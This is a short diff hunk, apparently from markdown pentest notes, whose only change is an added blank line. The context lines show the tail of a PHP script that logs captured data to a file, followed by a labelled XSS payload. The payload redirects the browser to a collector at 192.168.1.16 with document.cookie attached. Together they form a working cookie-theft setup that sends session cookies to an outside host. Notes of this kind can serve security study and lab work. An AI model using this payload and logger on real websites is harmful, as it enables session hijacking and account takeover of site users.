@@ -23,6 +23,7 @@ $f=fopen(“log.txt”,”a”);
 fwrite($f,$log);
 ?>
 ```
+
   - XSS Payload
 ```javascript
 <script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
